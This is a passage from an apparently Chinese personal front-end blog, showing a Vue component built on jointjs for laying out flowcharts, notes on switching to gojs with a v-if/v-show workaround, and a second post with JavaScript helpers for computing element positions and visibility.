class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">window</span>.joint=<span class="built_in">require</span>(<span class="string">'jointjs'</span>);</span><br><span class="line"><span class="keyword">var</span> Shape = joint.dia.Element.define(<span class="string">'default.Rectangle'</span>, &#123;      </span><br><span class="line">        attrs: &#123;  </span><br><span class="line">            rect: &#123;</span><br><span class="line">                refWidth: <span class="string">'100%'</span>,</span><br><span class="line">                refHeight: <span class="string">'100%'</span>,</span><br><span class="line">                <span class="comment">//下面这些可以自己设置</span></span><br><span class="line">                fill:&#123;</span><br><span class="line">                    type: <span class="string">'linearGradient'</span>,</span><br><span class="line">                    stops: [</span><br><span class="line">                        &#123;<span class="attr">offset</span>: <span class="string">'0%'</span>, <span class="attr">color</span>: <span class="string">'#B0E0E6'</span>&#125;,<span class="comment">//渐变开始</span></span><br><span class="line">                        &#123;<span class="attr">offset</span>: <span class="string">'100%'</span>, <span class="attr">color</span>: <span class="string">'#F0F8FF'</span>&#125;<span class="comment">//渐变结束</span></span><br><span class="line">                    ]</span><br><span class="line">                &#125;,</span><br><span class="line">                stroke: <span class="string">'#B0E0E6'</span>,</span><br><span class="line">                strokeWidth: <span class="number">1</span>,</span><br><span class="line">                rx: <span class="number">5</span>,<span class="comment">//圆角</span></span><br><span class="line">                ry: <span class="number">5</span></span><br><span class="line">            &#125;,</span><br><span class="line">            text: &#123;</span><br><span class="line">                refX: <span class="string">'50%'</span>,</span><br><span class="line">                refY: <span class="string">'50%'</span>,                               </span><br><span class="line">                textVerticalAnchor: <span class="string">'middle'</span>,</span><br><span class="line">                textAnchor: <span class="string">'middle'</span>,</span><br><span class="line">                fontSize: <span class="number">10</span>           </span><br><span class="line">            &#125;</span><br><span class="line">         &#125;                    </span><br><span class="line">    &#125;, </span><br><span class="line">    &#123;</span><br><span class="line">         markup: <span class="string">'&lt;rect/&gt;&lt;text/&gt;'</span>,</span><br><span class="line">         setText: <span class="function"><span class="keyword">function</span>(<span class="params">text</span>) </span>&#123;                    </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.attr(<span class="string">'text/text'</span>, text || <span class="string">''</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        setShapeStyle:<span class="function"><span class="keyword">function</span>(<span class="params">shapeStyle</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">let</span> newstyle = <span class="built_in">Object</span>.assign(&#123;&#125;,<span class="keyword">this</span>.attr(<span class="string">'rect'</span>),shapeStyle);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.attr(<span class="string">'rect'</span>,newstyle)</span><br><span class="line">        &#125;,</span><br><span class="line">        </span><br><span class="line">        setTextStyle:<span class="function"><span class="keyword">function</span>(<span class="params">textStyle</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">let</span> newstyle = <span class="built_in">Object</span>.assign(&#123;&#125;,<span class="keyword">this</span>.attr(<span class="string">'text'</span>),textStyle);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.attr(<span class="string">'text'</span>,newstyle)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Link = joint.dia.Link.define(<span class="string">'default.Link'</span>, &#123;</span><br><span class="line">        attrs: &#123;</span><br><span class="line">            <span class="string">'.connection'</span>: &#123;</span><br><span class="line">                stroke: <span class="string">'#2F4F4F'</span>,<span class="comment">//线</span></span><br><span class="line">                strokeWidth: <span class="number">1</span>,</span><br><span class="line">                pointerEvents: <span class="string">'none'</span>,</span><br><span class="line">                targetMarker: &#123;<span class="comment">//箭头</span></span><br><span class="line">                    type: <span class="string">'path'</span>,</span><br><span class="line">                    fill: <span class="string">'#2F4F4F'</span>,<span class="comment">//填充颜色</span></span><br><span class="line">                    stroke: <span class="string">'#2F4F4F'</span>,<span class="comment">//边框颜色</span></span><br><span class="line">                    strokeWidth:<span class="string">'1'</span>,</span><br><span class="line">                    d: <span class="string">'M 2 -2 0 0 2 2 z'</span><span class="comment">//形状</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        connector: &#123;</span><br><span class="line">            name: <span class="string">'rounded'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        z: <span class="number">-1</span>,</span><br><span class="line">        weight: <span class="number">1</span>,</span><br><span class="line">        minLen: <span class="number">1</span>,</span><br><span class="line">        labelPosition: <span class="string">'c'</span>,</span><br><span class="line">        labelOffset: <span class="number">10</span>,</span><br><span class="line">        labelSize: &#123;</span><br><span class="line">            width: <span class="number">50</span>,</span><br><span class="line">            height: <span class="number">30</span></span><br><span class="line">        &#125;,</span><br><span class="line">        labels: [&#123;</span><br><span class="line">            markup: <span class="string">'&lt;rect/&gt;&lt;text/&gt;'</span>,</span><br><span class="line">            attrs: &#123;</span><br><span class="line">                text: &#123;</span><br><span class="line">                    fill: <span class="string">'gray'</span>,</span><br><span class="line">                    textAnchor: <span class="string">'middle'</span>,</span><br><span class="line">                    refY: <span class="number">5</span>,</span><br><span class="line">                    refY2: <span class="string">'-50%'</span>,</span><br><span class="line">                    fontSize: <span class="number">10</span>,</span><br><span class="line">                    cursor: <span class="string">'pointer'</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="comment">// rect: &#123;</span></span><br><span class="line">                <span class="comment">//     fill: 'lightgray',</span></span><br><span class="line">                <span class="comment">//     stroke: 'gray',</span></span><br><span class="line">                <span class="comment">//     strokeWidth: 2,</span></span><br><span class="line">                <span class="comment">//     refWidth: '100%',</span></span><br><span class="line">                <span class="comment">//     refHeight: '100%',</span></span><br><span class="line">                <span class="comment">//     refX: '-50%',</span></span><br><span class="line">                <span class="comment">//     refY: '-50%',</span></span><br><span class="line">                <span class="comment">//     rx: 5,</span></span><br><span class="line">                <span class="comment">//     ry: 5</span></span><br><span class="line">                <span class="comment">// &#125;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            size: &#123;</span><br><span class="line">                width: <span class="number">50</span>, <span class="attr">height</span>: <span class="number">10</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;]</span><br><span class="line"></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        markup: <span class="string">'&lt;path class="connection"/&gt;&lt;g class="labels"/&gt;'</span>,</span><br><span class="line">        </span><br><span class="line">        connect: <span class="function"><span class="keyword">function</span>(<span class="params">sourceId, targetId</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.set(&#123;</span><br><span class="line">                source: &#123; <span class="attr">id</span>: sourceId &#125;,</span><br><span class="line">                target: &#123; <span class="attr">id</span>: targetId &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        setLabelText: <span class="function"><span class="keyword">function</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.prop(<span class="string">'labels/0/attrs/text/text'</span>, text || <span class="string">''</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ElementView = joint.dia.ElementView.extend(&#123;</span><br><span class="line">        pointerdown: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// this._click = true;</span></span><br><span class="line">            <span class="comment">// joint.dia.ElementView.prototype.pointerdown.apply(this, arguments);</span></span><br><span class="line">        &#125;,</span><br><span class="line">        pointermove: <span class="function"><span class="keyword">function</span>(<span class="params">evt, x, y</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// this._click = false;</span></span><br><span class="line">            <span class="comment">// joint.dia.ElementView.prototype.pointermove.apply(this, arguments);</span></span><br><span class="line">        &#125;,</span><br><span class="line">        pointerup: <span class="function"><span class="keyword">function</span> (<span class="params">evt, x, y</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// if (this._click) &#123;</span></span><br><span class="line">            <span class="comment">//     // triggers an event on the paper and the element itself</span></span><br><span class="line">            <span class="comment">//     this.notify('cell:click', evt, x, y); </span></span><br><span class="line">            <span class="comment">// &#125; else &#123;</span></span><br><span class="line">            <span class="comment">//     joint.dia.ElementView.prototype.pointerup.apply(this, arguments);</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="keyword">var</span> LinkView = joint.dia.LinkView.extend(&#123;</span><br><span class="line">    addVertex: <span class="function"><span class="keyword">function</span>(<span class="params">evt, x, y</span>) </span>&#123;&#125;,</span><br><span class="line">    removeVertex: <span class="function"><span class="keyword">function</span>(<span class="params">endType</span>) </span>&#123;&#125;,</span><br><span class="line">    pointerdown:<span class="function"><span class="keyword">function</span>(<span class="params">evt, x, y</span>) </span>&#123;&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;   </span><br><span class="line">    data()&#123;</span><br><span class="line">        <span class="keyword">return</span>&#123;</span><br><span class="line">            graph:<span class="literal">null</span>,</span><br><span class="line">            paper:<span class="literal">null</span>,</span><br><span class="line">            show:<span class="literal">true</span></span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;,</span><br><span class="line">    props:&#123;</span><br><span class="line">        graphData:&#123;</span><br><span class="line">            type:<span class="built_in">Object</span>,</span><br><span class="line">            required:<span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    mounted()&#123;</span><br><span class="line">        <span class="keyword">let</span> w = <span class="built_in">document</span>.getElementById(<span class="string">'container'</span>).width ; </span><br><span class="line">        <span class="keyword">this</span>.graph = <span class="keyword">new</span> joint.dia.Graph;</span><br><span class="line">        <span class="keyword">this</span>.paper = <span class="keyword">new</span> joint.dia.Paper(&#123;</span><br><span class="line">            el: <span class="built_in">document</span>.getElementById(<span class="string">'myholder'</span>),</span><br><span class="line">            width: w,</span><br><span class="line">            height: <span class="number">250</span>,         </span><br><span class="line">            model: <span class="keyword">this</span>.graph,</span><br><span class="line">            elementView: ElementView,<span class="comment">//禁止拖拽</span></span><br><span class="line">            linkView:LinkView<span class="comment">//禁止拖拽</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">this</span>.layout();</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">        getWidthandHeight(label)&#123;</span><br><span class="line">            <span class="keyword">let</span> maxLineLength = _.max(label.split(<span class="string">'\n'</span>), <span class="function"><span class="keyword">function</span>(<span class="params">l</span>) </span>&#123; <span class="keyword">return</span> l.length; &#125;).length,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Compute width/height of the rectangle based on the number</span></span><br><span class="line">            <span class="comment">// of lines in the label and the letter size. 0.6 * letterSize is</span></span><br><span class="line">            <span class="comment">// an approximation of the monospace font letter width.</span></span><br><span class="line">             letterSize = <span class="number">8</span>,</span><br><span class="line">             width = <span class="number">2</span> * (letterSize * (<span class="number">0.6</span> * maxLineLength + <span class="number">1</span>)),</span><br><span class="line">             height = <span class="number">2</span> * ((label.split(<span class="string">'\n'</span>).length + <span class="number">1</span>) * letterSize);</span><br><span class="line">            <span class="keyword">return</span> &#123;width,height&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        getLayoutOptions() &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="comment">// setVertices: false,</span></span><br><span class="line">                <span class="comment">// setLabels: false,</span></span><br><span class="line">                <span class="comment">// ranker:'longer-path',//'tight-tree'/'network-simplex',</span></span><br><span class="line">                rankDir: <span class="string">'LR'</span>,</span><br><span class="line">                align: <span class="string">'UR'</span>,</span><br><span class="line">                rankSep:<span class="number">0</span>,</span><br><span class="line">                edgeSep:<span class="number">0</span>,</span><br><span class="line">                nodeSep:<span class="number">0</span>,</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;,</span><br><span class="line">        buildGraphFromAdjacencyList(adjacencyList) &#123;</span><br><span class="line">            <span class="keyword">let</span> elements = [],links = [],obj,size,node;</span><br><span class="line">            <span class="keyword">const</span> _this=<span class="keyword">this</span>;</span><br><span class="line">            <span class="keyword">const</span> map=<span class="keyword">this</span>.graphData.node;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">Object</span>.keys(adjacencyList).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">parentId</span>) </span>&#123;</span><br><span class="line">                <span class="comment">// Add element</span></span><br><span class="line"></span><br><span class="line">                obj =map[parentId];</span><br><span class="line">                size = _this.getWidthandHeight(obj.text);</span><br><span class="line">                node =<span class="keyword">new</span> Shape(&#123;<span class="attr">id</span>:parentId,<span class="attr">size</span>:size&#125;).setText(obj.text);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(obj.category&amp;&amp;obj.category.shapeStyle)&#123;</span><br><span class="line">                    node = node.setShapeStyle(obj.category.shapeStyle);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(obj.category&amp;&amp;obj.category.textStyle)&#123;</span><br><span class="line">                    node = node.setTextStyle(obj.category.textStyle);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                elements.push(node);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// Add links</span></span><br><span class="line">                adjacencyList[parentId].forEach(<span class="function"><span class="keyword">function</span>(<span class="params">childId</span>) </span>&#123;</span><br><span class="line">                    links.push(</span><br><span class="line">                        <span class="keyword">new</span> Link().connect(parentId, childId)<span class="comment">// .setLabelText(parentLabel + '-' + childLabel)                                         </span></span><br><span class="line">                    );</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> elements.concat(links);</span><br><span class="line">        &#125;,</span><br><span class="line">        layout() &#123;            </span><br><span class="line">            <span class="keyword">let</span> cells = <span class="keyword">this</span>.buildGraphFromAdjacencyList(<span class="keyword">this</span>.graphData.edge);    </span><br><span class="line">            <span class="keyword">this</span>.graph.resetCells(cells);</span><br><span class="line">            joint.layout.DirectedGraph.layout(<span class="keyword">this</span>.graph, <span class="keyword">this</span>.getLayoutOptions());</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">#myholder &#123;</span></span><br><span class="line"><span class="regexp">    border: 1px solid lightgray;</span></span><br><span class="line"><span class="regexp">    margin-bottom:20px;</span></span><br><span class="line"><span class="regexp">    padding-left:20px</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">.tip&#123;</span></span><br><span class="line"><span class="regexp">  color:#9ACD32;</span></span><br><span class="line"><span class="regexp">  font-size:0.9em;</span></span><br><span class="line"><span class="regexp">  font-weight:bold;</span></span><br><span class="line"><span class="regexp">  padding:5px;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>style&gt;</span><br></pre></td></tr></table></figure>
<p>这是我自己包装的代码地址：<a href="https://github.com/LRY1994/vue-lib/tree/master/src/components/process-joint" target="_blank" rel="noopener">https://github.com/LRY1994/vue-lib/tree/master/src/components/process-joint</a></p>
<p>这个目前看来还算满意</p>
<h3 id="jsplumb"><a href="#jsplumb" class="headerlink" title="jsplumb"></a>jsplumb</h3><p>这个看了官网，不太友好，而且下载只有一个js文件，没有demo代码，不知如何下手</p>
<h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><p><a href="https://gojs.net/latest/samples/pageFlow.html" target="_blank" rel="noopener">https://gojs.net/latest/samples/pageFlow.html</a><br><a href="http://www.daviddurman.com/assets/autolayout.js" target="_blank" rel="noopener">http://www.daviddurman.com/assets/autolayout.js</a><br><a href="http://resources.jointjs.com/demos/layout" target="_blank" rel="noopener">http://resources.jointjs.com/demos/layout</a></p>
<p>———————————————更新 2018/8/30———————————————————-<br>经过一番实践，我觉得jointjs不好用了。<br>不满意点：</p>
<ol>
<li>不能相对容器自动布局，都用的是死的像素，分辨率低的屏幕，部分图有些就看不见<img src="/study/2018/8/procedure/joint-error.png"></li>
<li>不能滚动鼠标自己缩小放大</li>
<li>比较丑，也可能是我不会配色</li>
</ol>
<p>最终采用gojs,上面提到的问题解决方案是：把去掉水印的gojs放在自己的npm服务器上，这样就可以npm安装了！！！<br>实践过程中遇到个问题<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">process-go</span> <span class="attr">style</span>=<span class="string">"height:250px"</span>  <span class="attr">v-if</span>=<span class="string">"show"</span>  <span class="attr">:model-data</span>=<span class="string">"dataObj.graph"</span> <span class="attr">:category</span>=<span class="string">"category"</span>&gt;</span> <span class="tag">&lt;/<span class="name">process-go</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>像这样，用<code>v-if</code>反复切换，会报错<code>Cannot read property &#39;type&#39; of undefined     at Po (go.js?d976:1044)</code></p>
<p>换成<code>v-show</code>就不会<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">process-go</span> <span class="attr">style</span>=<span class="string">"height:250px"</span>  <span class="attr">v-show</span>=<span class="string">"show"</span>  <span class="attr">:model-data</span>=<span class="string">"dataObj.graph"</span> <span class="attr">:category</span>=<span class="string">"category"</span>&gt;</span> <span class="tag">&lt;/<span class="name">process-go</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>但是这样的前提是show初始化是true.如果初始化为false,没有报错，但是图呈现不出来。<br>原因我猜测是：show初始化为false,组件高度为0，因为默认画布就是组件容器，所以画布高度变成0，图画不出。</p>
<p>最后想出个方法。<code>v-if</code>和<code>v-show</code>结合一起使用，加上<code>$once</code>方法，代码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">process-go</span> <span class="attr">style</span>=<span class="string">"height:250px"</span> <span class="attr">v-if</span>=<span class="string">"firstClick"</span> <span class="attr">v-show</span>=<span class="string">"show"</span>  <span class="attr">:model-data</span>=<span class="string">"dataObj.graph"</span> <span class="attr">:category</span>=<span class="string">"category"</span>&gt;</span> <span class="tag">&lt;/<span class="name">process-go</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">data()&#123;</span><br><span class="line">    <span class="keyword">return</span>&#123;        </span><br><span class="line">        show:<span class="literal">false</span>,</span><br><span class="line">        firstClick:<span class="literal">false</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">created()&#123;</span><br><span class="line">    <span class="keyword">this</span>.init();</span><br><span class="line">    <span class="keyword">this</span>.$once(<span class="string">'firstClick'</span>,()=&gt;&#123;</span><br><span class="line">        <span class="keyword">this</span>.firstClick = <span class="literal">true</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line">    init()&#123;...&#125;,</span><br><span class="line">    look()&#123;<span class="comment">//用v-if切换会报错，只有第一次点击查看用v-if,其他用v-show</span></span><br><span class="line">        <span class="keyword">this</span>.$emit(<span class="string">'firstClick'</span>);</span><br><span class="line">        <span class="keyword">this</span>.show = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重新封装了一下gojs 地址：<a href="https://github.com/LRY1994/vue-lib/blob/master/src/components/process-go/index.vue" target="_blank" rel="noopener">https://github.com/LRY1994/vue-lib/blob/master/src/components/process-go/index.vue</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/学习/">学习</a>►<a class="article-category-link" href="/categories/学习/专题笔记/">专题笔记</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/study/Comprehensive/visible-area.html" title="HTML元素定位" itemprop="url">HTML元素定位</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="Ruiyu Lin" target="_blank" itemprop="author">Ruiyu Lin</a>
		
  <p class="article-time">
    <time datetime="2018-07-11T16:00:00.000Z" itemprop="datePublished"> Published 2018-07-12</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p> getBoundingClientRect() 获取它相对于视图窗口的坐标</p>
<h2 id="HTML元素精准定位"><a href="#HTML元素精准定位" class="headerlink" title="HTML元素精准定位"></a>HTML元素精准定位</h2><p><code>event.clientX</code> 相对文档的水平座标 </p>
<p><code>event.clientY</code> 相对文档的垂直座标 </p>
<p><code>event.offsetX</code> 相对容器的水平坐标 </p>
<p><code>event.offsetY</code> 相对容器的垂直坐标 </p>
<p>网页正文项目组上： <code>window.screenTop</code>;</p>
<p>网页正文项目组左： <code>window.screenLeft</code>;</p>
<img src="/study/Comprehensive/visible-area/element-position.gif">
<img src="/study/Comprehensive/visible-area/pic2.jpg">
<p>clientTop/clientLeft  这个属性就是border宽度。</p>
<p>offset包括border,client不包括border</p>
<p>document.documentElement / body要做兼容</p>
<h2 id="如何获取元素相对于整个网页的精确位置"><a href="#如何获取元素相对于整个网页的精确位置" class="headerlink" title="如何获取元素相对于整个网页的精确位置"></a>如何获取元素相对于整个网页的精确位置</h2><p><strong>el.offsetLeft + el.clientLeft - el.scrollLeft</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Helper function to get an element's exact position</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPosition</span>(<span class="params">el</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xPos = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> yPos = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">while</span> (el) &#123;</span><br><span class="line">    <span class="keyword">if</span> (el.tagName == <span class="string">"BODY"</span>) &#123;</span><br><span class="line">      <span class="comment">// deal with browser quirks with body/window/document and page scroll</span></span><br><span class="line">      <span class="keyword">var</span> xScroll = el.scrollLeft || <span class="built_in">document</span>.documentElement.scrollLeft;</span><br><span class="line">      <span class="keyword">var</span> yScroll = el.scrollTop || <span class="built_in">document</span>.documentElement.scrollTop;</span><br><span class="line"> </span><br><span class="line">      xPos += (el.offsetLeft - xScroll + el.clientLeft);</span><br><span class="line">      yPos += (el.offsetTop - yScroll + el.clientTop);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// for all other non-BODY elements</span></span><br><span class="line">      xPos += (el.offsetLeft - el.scrollLeft + el.clientLeft);</span><br><span class="line">      yPos += (el.offsetTop - el.scrollTop + el.clientTop);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    el = el.offsetParent;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    x: xPos,</span><br><span class="line">    y: yPos</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="判断元素是否在某个容器里的可视区域"><a href="#判断元素是否在某个容器里的可视区域" class="headerlink" title="判断元素是否在某个容器里的可视区域"></a>判断元素是否在某个容器里的可视区域</h2><p><strong>el.offsetLeft + el.clientLeft</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * el 查询元素</span></span><br><span class="line"><span class="comment"> * scrollParent el最近的可滚动祖先节点</span></span><br><span class="line"><span class="comment"> * offset 预留的预加载距离</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">const</span> checkInView=<span class="function">(<span class="params">el,scrollParent,offset</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> scrollTop,clientH,clientW,scrollLeft;</span><br><span class="line">    <span class="keyword">let</span> offsetTop=<span class="number">0</span>,offsetLeft=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(scrollParent === <span class="built_in">window</span>) &#123;</span><br><span class="line">        scrollTop=<span class="built_in">document</span>.documentElement.scrollTop||<span class="built_in">document</span>.body.scrollTop;</span><br><span class="line">        scrollLeft=<span class="built_in">document</span>.documentElement.scrollLeft||<span class="built_in">document</span>.body.scrollLeft;</span><br><span class="line">        clientH=<span class="built_in">document</span>.documentElement.clientHeight||<span class="built_in">document</span>.body.clientHeight;</span><br><span class="line">        clientW=<span class="built_in">document</span>.documentElement.clientWidth||<span class="built_in">document</span>.body.clientWidth;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        scrollTop = scrollParent.scrollTop;</span><br><span class="line">        scrollLeft=scrollParent.scrollLeft;</span><br><span class="line">        clientH = scrollParent.clientHeight;</span><br><span class="line">        clientW=scrollParent.clientWidth;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(el!=scrollParent &amp;&amp; el!=<span class="literal">null</span>)&#123;</span><br><span class="line">        offsetTop+=el.offsetTop+el.clientTop;</span><br><span class="line">        offsetLeft+=el.offsetLeft+el.clientLeft;</span><br><span class="line">        el=el.offsetParent;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(scrollTop+clientH&gt;offsetTop-offset &amp;&amp; scrollLeft+clientW&gt;offsetLeft-offset)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
